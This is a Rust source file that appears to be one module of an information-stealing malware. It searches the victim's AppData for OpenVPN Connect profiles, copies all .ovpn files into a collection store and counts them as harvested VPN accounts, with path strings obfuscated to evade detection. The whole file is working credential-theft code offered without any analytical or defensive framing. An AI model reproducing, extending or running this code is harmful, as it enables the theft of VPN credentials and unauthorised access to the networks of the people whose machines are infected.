use crate::alloc::borrow::ToOwned;
use collector::{Collector, Vpn};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{copy_content_with_filter, FileSystem};
use obfstr::obfstr as s;
use tasks::{parent_name, Task};

pub(super) struct OpenVPN;

impl<C: Collector, F: FileSystem> Task<C, F> for OpenVPN {
    parent_name!("OpenVPN");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let profiles = Path::appdata() / s!("OpenVPN Connect") / s!("profiles");

        if !StorageFileSystem.is_exists(&profiles) {
            return;
        }

        if copy_content_with_filter(
            StorageFileSystem,
            &profiles,
            filesystem,
            parent,
            &profile_filter,
        )
        .is_ok()
        {
            let count = StorageFileSystem
                .list_files_filtered(profiles, &profile_filter)
                .map(|files| files.len())
                .unwrap_or(0);

            collector.get_vpn().increase_accounts_by(count);
        }
    }
}

fn profile_filter(path: &Path) -> bool {
    path.extension()
        .map(|ex| ex.contains(s!("ovpn")))
        .unwrap_or(false)
}
